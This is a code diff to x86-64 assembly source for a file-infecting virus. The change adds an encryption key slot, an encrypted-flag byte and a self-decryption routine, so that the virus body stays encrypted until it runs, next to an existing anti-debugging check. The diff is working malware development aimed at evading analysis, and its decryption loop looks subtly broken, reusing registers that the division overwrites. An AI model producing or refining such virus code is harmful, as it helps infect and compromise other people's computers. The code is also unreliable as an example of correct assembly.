@@ -9,6 +9,14 @@ virus_start:
 original_entry_storage:
     dq 0                        ; 8 bytes for original entry point
 
+; Encryption key storage (16 bytes for alphanumeric key)
+encryption_key:
+    db "0000000000000000"        ; Will be replaced by encrypt program
+    
+; Encrypted flag (1 byte: 0 = not encrypted, 1 = encrypted)
+encrypted_flag:
+    db 0
+
 _start:
     ; Save all registers we'll use
     push rbp
@@ -18,6 +26,41 @@ _start:
     push r13
     push r14
     push r15
+
+    ; ============================================
+    ; DECRYPTION CHECK AND ROUTINE
+    ; Check if code is encrypted and decrypt if needed
+    ; ============================================
+    ; Get base address for decryption
+    call .get_decrypt_base
+.get_decrypt_base:
+    pop r15
+    sub r15, .get_decrypt_base - virus_start
+    
+    ; Check encrypted flag
+    movzx eax, byte [r15 + encrypted_flag - virus_start]
+    test al, al
+    jz .not_encrypted           ; If 0, code is not encrypted
+    
+    ; Decrypt the virus code
+    ; Calculate start of decryption area (right after _start)
+    lea rdi, [r15 + decrypt_code.end - virus_start]
+    ; Calculate size to decrypt (from decrypt_end to virus_end)
+    mov rsi, virus_end - decrypt_code.end
+    ; Get encryption key
+    lea rdx, [r15 + encryption_key - virus_start]
+    mov rcx, 16                 ; key size
+    call decrypt_code
+    
+    ; Clear encrypted flag so we don't decrypt again
+    mov byte [r15 + encrypted_flag - virus_start], 0
+    
+.not_encrypted:
+    ; Re-get base address since r15 might have been modified
+    call .get_base_after_decrypt
+.get_base_after_decrypt:
+    pop r15
+    sub r15, .get_base_after_decrypt - virus_start
 
     ; ============================================
     ; ANTI-DEBUGGING CHECK
@@ -76,7 +119,75 @@ _start:
     xor edi, edi                ; exit code 0
     syscall
 
-.run_as_virus:
+; ============================================
+; decrypt_code - Decrypt buffer with XOR and rotation
+; rdi = buffer to decrypt
+; rsi = buffer size  
+; rdx = key pointer
+; rcx = key size
+; Uses XOR with rotating key and bit rotation (reverse of encryption)
+; This function must NOT be encrypted (it's the decryptor)
+; ============================================
+decrypt_code:
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push r12
+    push r13
+    push r14
+    
+    mov r12, rdi        ; buffer
+    mov r13, rsi        ; buffer size
+    mov r14, rdx        ; key pointer
+    ; rcx already has key size
+    
+    xor rbx, rbx        ; buffer offset
+    xor r8, r8          ; key index
+    
+.decrypt_loop:
+    cmp rbx, r13
+    jge .decrypt_done
+    
+    ; Get current encrypted byte
+    mov al, [r12 + rbx]
+    
+    ; Reverse rotation (rotate right by 3)
+    ror al, 3
+    
+    ; Get key byte (rotating through key)
+    mov rax, r8
+    xor rdx, rdx
+    div rcx             ; r8 / key_size, remainder in rdx
+    mov r10b, [r14 + rdx]  ; key byte
+    
+    ; XOR with key byte
+    mov al, [r12 + rbx]
+    ror al, 3           ; First undo rotation
+    xor al, r10b        ; Then undo XOR
+    
+    ; Store decrypted byte
+    mov [r12 + rbx], al
+    
+    inc rbx
+    inc r8
+    jmp .decrypt_loop
+    
+.decrypt_done:
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
+    mov rsp, rbp
+    pop rbp
+    ret
+
+.end:
+; ============================================
+; END OF DECRYPTION CODE  
+; Everything after this label will be encrypted
+; ============================================
+
+_start.run_as_virus:
     ; ===== VIRUS EXECUTION PATH IN INFECTED BINARY =====
     ; We're running as the virus payload in an infected binary
     ; We need to use stack-based buffers and position-independent code
